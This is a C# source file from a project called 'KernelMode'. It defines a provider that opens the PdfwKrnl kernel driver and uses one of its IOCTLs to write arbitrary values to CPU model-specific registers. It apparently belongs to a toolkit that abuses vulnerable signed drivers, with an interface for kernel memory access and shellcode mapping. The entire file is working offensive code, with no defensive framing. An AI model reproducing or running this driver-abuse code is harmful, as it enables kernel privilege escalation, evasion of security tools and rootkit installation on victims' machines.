// File: Providers/PdfwProvider.cs
// Project: KernelMode

using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using KernelMode.Providers;
using KernelMode.Utils;

namespace KernelMode.Providers
{
	public class PdfwProvider : IProvider
	{
		private const string DeviceName = "\\\\.\\PdfwKrnl";
		private const uint IOCTL_WRITE_MSR = 0xA0402488;

		private SafeFileHandle _handle;
		public bool IsInitialized { get; private set; }

		[StructLayout(LayoutKind.Sequential)]
		private struct MsrInput
		{
			public uint Register;
			public ulong Value;
		}

		public bool Initialize()
		{
			_handle = NativeMethods.CreateFile(DeviceName,
				NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
				0, IntPtr.Zero, NativeMethods.OPEN_EXISTING,
				0, IntPtr.Zero);

			IsInitialized = !_handle.IsInvalid && !_handle.IsClosed;
			return IsInitialized;
		}

		public bool ReadMemory(ulong address, byte[] buffer, int size)
		{
			Console.WriteLine("[-] PdfwProvider does not support read ops.");
			return false;
		}

		public bool WriteMemory(ulong address, byte[] buffer, int size)
		{
			if (!IsInitialized || size != 8)
			{
				Console.WriteLine("[-] Pdfw only supports 8-byte MSR writes.");
				return false;
			}

			var req = new MsrInput
			{
				Register = (uint)(address & 0xFFFFFFFF),
				Value = BitConverter.ToUInt64(buffer, 0)
			};

			IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(MsrInput)));
			Marshal.StructureToPtr(req, reqPtr, false);

			int bytesReturned;
			bool result = NativeMethods.DeviceIoControl(
				_handle,
				IOCTL_WRITE_MSR,
				reqPtr,
				Marshal.SizeOf(typeof(MsrInput)),
				IntPtr.Zero,
				0,
				out bytesReturned,
				IntPtr.Zero);

			Marshal.FreeHGlobal(reqPtr);
			return result;
		}


		public bool MapShellcode(byte[] shellcode, ulong param)
		{
			Console.WriteLine("[-] PdfwProvider does not support shellcode mapping.");
			return false;
		}

		public void Dispose()
		{
			_handle?.Dispose();
		}
	}
}
